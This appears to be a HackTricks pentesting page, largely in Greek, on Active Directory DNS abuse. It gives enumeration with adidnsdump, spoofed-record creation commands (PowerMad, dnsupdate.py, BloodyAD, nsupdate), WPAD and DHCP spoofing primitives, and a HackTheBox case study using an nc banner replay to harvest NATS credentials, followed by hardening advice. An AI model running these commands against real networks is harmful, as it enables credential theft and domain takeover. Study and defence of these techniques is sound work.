# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Από προεπιλογή, **οποιοσδήποτε χρήστης** στο Active Directory μπορεί να **απαριθμήσει όλες τις εγγραφές DNS** στις ζώνες DNS του Domain ή του Forest, παρόμοια με ένα zone transfer (οι χρήστες μπορούν να απαριθμήσουν τα child objects μιας DNS zone σε ένα AD περιβάλλον).

Το εργαλείο [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) επιτρέπει την **απαρίθμηση** και **εξαγωγή** **όλων των εγγραφών DNS** στη ζώνη για recon σκοπούς εσωτερικών δικτύων.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (Απρίλιος 2025) προσθέτει JSON/Greppable (`--json`) έξοδο, πολυνηματική επίλυση DNS και υποστήριξη για TLS 1.2/1.3 κατά τη σύνδεση με LDAPS

Για περισσότερες πληροφορίες διαβάστε [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Δημιουργία / Τροποποίηση εγγραφών (ADIDNS spoofing)

Επειδή η ομάδα **Authenticated Users** έχει εξ ορισμού **Create Child** στο zone DACL, οποιοσδήποτε λογαριασμός domain (ή λογαριασμός υπολογιστή) μπορεί να καταχωρήσει επιπλέον εγγραφές. Αυτό μπορεί να χρησιμοποιηθεί για ανακατεύθυνση κυκλοφορίας, εξαναγκασμό NTLM relay ή ακόμα και για πλήρη συμβιβασμό του domain.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py συνοδεύεται από Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Common attack primitives

1. **Wildcard record** – το `*.<zone>` μετατρέπει τον AD DNS server σε enterprise-wide responder, παρόμοιο με το LLMNR/NBNS spoofing. Μπορεί να καταχραστεί για να συλλέξει NTLM hashes ή να τα relay-άρει σε LDAP/SMB. (Requires WINS-lookup to be disabled.)
2. **WPAD hijack** – προσθέστε `wpad` (ή μια **NS** record που δείχνει σε attacker host για να bypass-άρετε το Global-Query-Block-List) και κάντε transparent proxy τα εξερχόμενα HTTP requests για να harvest-άρετε διαπιστευτήρια. Microsoft patched τα wildcard/ DNAME bypasses (CVE-2018-8320) αλλά οι **NS-records still work**.
3. **Stale entry takeover** – διεκδικήστε την IP address που προηγουμένως ανήκε σε ένα workstation και η αντίστοιχη DNS εγγραφή θα εξακολουθεί να επιλύεται, επιτρέποντας resource-based constrained delegation ή Shadow-Credentials attacks χωρίς να αγγίξετε καθόλου το DNS.
4. **DHCP → DNS spoofing** – σε μια default Windows DHCP+DNS ανάπτυξη, ένας unauthenticated attacker στο ίδιο subnet μπορεί να overwrite οποιαδήποτε υπάρχουσα A record (συμπεριλαμβανομένων Domain Controllers) στέλνοντας forged DHCP requests που ενεργοποιούν dynamic DNS updates (Akamai “DDSpoof”, 2023). Αυτό παρέχει machine-in-the-middle πάνω σε Kerberos/LDAP και μπορεί να οδηγήσει σε πλήρη domain takeover.
5. **Certifried (CVE-2022-26923)** – αλλάξτε το `dNSHostName` ενός machine account που ελέγχετε, καταχωρήστε μια matching A record, και στη συνέχεια ζητήστε ένα certificate για αυτό το όνομα για να impersonate-άρετε τον DC. Εργαλεία όπως **Certipy** ή **BloodyAD** αυτοματοποιούν πλήρως τη ροή.

---

### Internal service hijacking via stale dynamic records (NATS case study)

When dynamic updates stay open to all authenticated users, **a de-registered service name can be re-claimed and pointed to attacker infrastructure**. The Mirage HTB DC exposed the hostname `nats-svc.mirage.htb` after DNS scavenging, so any low-privileged user could:

1. **Επιβεβαιώστε ότι η εγγραφή λείπει** και μάθετε το SOA με `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Επαναδημιουργήστε την εγγραφή** προς μια εξωτερική/VPN διεπαφή που ελέγχουν:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonate the plaintext service**. Οι πελάτες NATS αναμένουν να δουν ένα `INFO { ... }` banner πριν στείλουν διαπιστευτήρια, οπότε η αντιγραφή ενός νόμιμου banner από τον πραγματικό broker είναι αρκετή για να συλλέξει μυστικά:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Οποιοδήποτε client που επιλύει το hijacked όνομα θα αμέσως leak το JSON `CONNECT` frame του (συμπεριλαμβανομένων των `"user"`/`"pass"`) στον listener. Τρέχοντας το επίσημο binary `nats-server -V` στον attacker host, απενεργοποιώντας τη redaction των logs του, ή απλά sniffing τη συνεδρία με Wireshark αποκαλύπτει τα ίδια plaintext credentials επειδή το TLS ήταν optional.

4. **Pivot with the captured creds** – στο Mirage ο κλεμμένος NATS account παρείχε πρόσβαση σε JetStream, που αποκάλυψε ιστορικά authentication events που περιείχαν επαναχρησιμοποιήσιμα AD usernames/passwords.

Αυτό το μοτίβο ισχύει για κάθε AD-integrated service που βασίζεται σε ανεξασφαλισμένα TCP handshakes (HTTP APIs, RPC, MQTT, κ.λπ.): μόλις το DNS record υφαρπαχθεί, ο attacker γίνεται το service.

---

## Ανίχνευση & σκληροποίηση

* Deny **Authenticated Users** the *Create all child objects* right on sensitive zones and delegate dynamic updates to a dedicated account used by DHCP.
* If dynamic updates are required, set the zone to **Secure-only** and enable **Name Protection** in DHCP so that only the owner computer object can overwrite its own record.
* Monitor DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) and LDAP writes to `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Block dangerous names (`wpad`, `isatap`, `*`) with an intentionally-benign record or via the Global Query Block List.
* Keep DNS servers patched – e.g., RCE bugs CVE-2024-26224 and CVE-2024-26231 reached **CVSS 9.8** and are remotely exploitable against Domain Controllers.



## Αναφορές

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, εξακολουθεί να είναι η de-facto reference για wildcard/WPAD attacks)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
